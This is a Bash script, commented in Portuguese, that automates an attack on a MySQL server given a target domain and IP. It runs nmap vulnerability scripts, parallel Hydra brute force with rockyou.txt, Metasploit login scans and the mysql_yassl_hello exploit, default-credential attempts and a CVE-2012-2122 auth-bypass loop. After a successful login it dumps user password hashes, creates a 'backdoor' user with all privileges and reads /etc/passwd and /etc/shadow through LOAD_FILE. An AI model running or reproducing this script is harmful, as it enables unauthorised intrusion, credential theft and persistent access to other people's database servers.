#!/bin/bash
# Script de Exploração MySQL - Autônomo e Brutal

# Solicitar target e IP do usuário
if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Uso: $0 <DOMINIO> <IP>"
    echo "Exemplo: $0 exemplo.com.br 192.168.1.100"
    exit 1
fi

TARGET="$1"
IP="$2"
PORT="3306"
LOG_DIR="./logs"
RESULTS_DIR="./results"

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] Iniciando exploração MySQL contra ${TARGET}:${PORT}${NC}"

# Criar diretórios
mkdir -p $LOG_DIR $RESULTS_DIR

# Função para verificar e instalar ferramentas
check_and_install() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${YELLOW}[!] $1 não encontrado. Instalando...${NC}"
        sudo apt-get update -qq
        sudo apt-get install -y $2
    else
        echo -e "${GREEN}[+] $1 encontrado${NC}"
    fi
}

# Verificar e instalar ferramentas necessárias
echo -e "${GREEN}[*] Verificando ferramentas...${NC}"
check_and_install "nmap" "nmap"
check_and_install "hydra" "hydra"
check_and_install "mysql" "mysql-client"
check_and_install "msfconsole" "metasploit-framework"
check_and_install "sqlmap" "sqlmap"
check_and_install "john" "john"

# Wordlists
WORDLIST_DIR="/usr/share/wordlists"
if [ ! -f "$WORDLIST_DIR/rockyou.txt" ]; then
    echo -e "${YELLOW}[!] Baixando wordlist rockyou.txt...${NC}"
    sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt 2>/dev/null || \
    wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt
fi

# 1. SCANNING E RECONHECIMENTO
echo -e "${GREEN}[*] Fase 1: Scanning e Reconhecimento${NC}"
nmap -p $PORT --script mysql-info,mysql-enum,mysql-vuln-cve2012-2122,mysql-audit $IP -oN $LOG_DIR/mysql_scan.txt

# 2. BRUTE FORCE AGRESSIVO
echo -e "${GREEN}[*] Fase 2: Brute Force Agressivo${NC}"
echo -e "${RED}[!] Iniciando brute force com múltiplos usuários e wordlists...${NC}"

# Lista de usuários comuns
USERS=("root" "admin" "administrator" "mysql" "test" "user" "webadmin" "sysadmin" "netadmin" "guest" "web")

# Brute force com Hydra (múltiplas threads, agressivo)
for user in "${USERS[@]}"; do
    echo -e "${YELLOW}[*] Testando usuário: $user${NC}"
    hydra -l $user -P /tmp/rockyou.txt $IP mysql -s $PORT -t 16 -W 1 -f -o $LOG_DIR/hydra_${user}.txt 2>&1 &
done
wait

# 3. SQLMAP - INJEÇÃO E EXPLORAÇÃO
echo -e "${GREEN}[*] Fase 3: SQLMap - Teste de Injeção${NC}"
# Nota: SQLMap precisa de uma URL, mas podemos tentar conexão direta
echo -e "${YELLOW}[!] SQLMap requer URL web. Pulando para exploração direta.${NC}"

# 4. METASPLOIT - EXPLOITS AUTOMÁTICOS
echo -e "${GREEN}[*] Fase 4: Metasploit - Exploits Automáticos${NC}"
msfconsole -q -x "
use auxiliary/scanner/mysql/mysql_login;
set RHOSTS $IP;
set RPORT $PORT;
set USERNAME root;
set BLANK_PASSWORDS true;
set USER_AS_PASS true;
set VERBOSE true;
run;
use auxiliary/scanner/mysql/mysql_version;
set RHOSTS $IP;
set RPORT $PORT;
run;
use auxiliary/admin/mysql/mysql_enum;
set RHOSTS $IP;
set RPORT $PORT;
run;
use exploit/linux/mysql/mysql_yassl_hello;
set RHOSTS $IP;
set RPORT $PORT;
run;
exit;
" > $LOG_DIR/metasploit_mysql.txt 2>&1

# 5. TENTATIVA DE CONEXÃO DIRETA COM CREDENCIAIS COMUNS
echo -e "${GREEN}[*] Fase 5: Tentativas de Conexão Direta${NC}"
COMMON_PASSWORDS=("" "root" "admin" "password" "123456" "mysql" "test" "toor")

for user in "${USERS[@]}"; do
    for pass in "${COMMON_PASSWORDS[@]}"; do
        echo -e "${YELLOW}[*] Tentando: $user:$pass${NC}"
        mysql -h $IP -P $PORT -u $user -p"$pass" --skip-ssl --execute "SELECT 1;" 2>&1 | tee -a $LOG_DIR/mysql_connections.txt
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[!!!] SUCESSO: $user:$pass${NC}" | tee -a $RESULTS_DIR/mysql_credentials.txt
            # Tentar extrair informações
            mysql -h $IP -P $PORT -u $user -p"$pass" --skip-ssl --execute "SHOW DATABASES;" >> $RESULTS_DIR/mysql_databases.txt 2>&1
            mysql -h $IP -P $PORT -u $user -p"$pass" --skip-ssl --execute "SELECT user,host FROM mysql.user;" >> $RESULTS_DIR/mysql_users.txt 2>&1
        fi
    done
done

# 6. EXPLORAÇÃO DE VULNERABILIDADES CONHECIDAS
echo -e "${GREEN}[*] Fase 6: Exploração de Vulnerabilidades Conhecidas${NC}"
# CVE-2012-2122 (MySQL authentication bypass)
echo -e "${RED}[!] Tentando exploit CVE-2012-2122 (MySQL auth bypass)...${NC}"
for i in {1..1000}; do
    mysql -h $IP -P $PORT -u root --password=bad -e "SELECT 1;" 2>&1 | grep -q "Welcome" && {
        echo -e "${GREEN}[!!!] VULNERÁVEL A CVE-2012-2122!${NC}" | tee -a $RESULTS_DIR/mysql_cve2012-2122.txt
        break
    }
done

# 7. PÓS-EXPLORAÇÃO - SE CONSEGUIR ACESSO
echo -e "${GREEN}[*] Fase 7: Pós-Exploração${NC}"
if [ -f "$RESULTS_DIR/mysql_credentials.txt" ]; then
    echo -e "${GREEN}[+] Credenciais encontradas! Executando pós-exploração...${NC}"
    CRED=$(head -1 $RESULTS_DIR/mysql_credentials.txt | grep -oP 'SUCESSO: \K.*')
    USER=$(echo $CRED | cut -d: -f1)
    PASS=$(echo $CRED | cut -d: -f2)
    
    # Extrair todas as informações possíveis
    mysql -h $IP -P $PORT -u $USER -p"$PASS" --skip-ssl --execute "
    SELECT VERSION();
    SHOW DATABASES;
    SELECT user,host,password FROM mysql.user;
    SHOW VARIABLES LIKE 'version%';
    SELECT * FROM information_schema.SCHEMATA;
    " > $RESULTS_DIR/mysql_full_dump.txt 2>&1
    
    # Tentar criar backdoor
    echo -e "${RED}[!] Tentando criar usuário backdoor...${NC}"
    mysql -h $IP -P $PORT -u $USER -p"$PASS" --skip-ssl --execute "
    CREATE USER IF NOT EXISTS 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123!';
    GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
    FLUSH PRIVILEGES;
    " >> $RESULTS_DIR/mysql_backdoor.txt 2>&1
    
    # Tentar ler arquivos do sistema (se possível)
    echo -e "${RED}[!] Tentando ler arquivos do sistema...${NC}"
    mysql -h $IP -P $PORT -u $USER -p"$PASS" --skip-ssl --execute "
    SELECT LOAD_FILE('/etc/passwd');
    SELECT LOAD_FILE('/etc/shadow');
    SELECT LOAD_FILE('/etc/hosts');
    " >> $RESULTS_DIR/mysql_file_read.txt 2>&1
fi

echo -e "${GREEN}[*] Exploração MySQL concluída!${NC}"
echo -e "${GREEN}[*] Logs salvos em: $LOG_DIR${NC}"
echo -e "${GREEN}[*] Resultados salvos em: $RESULTS_DIR${NC}"

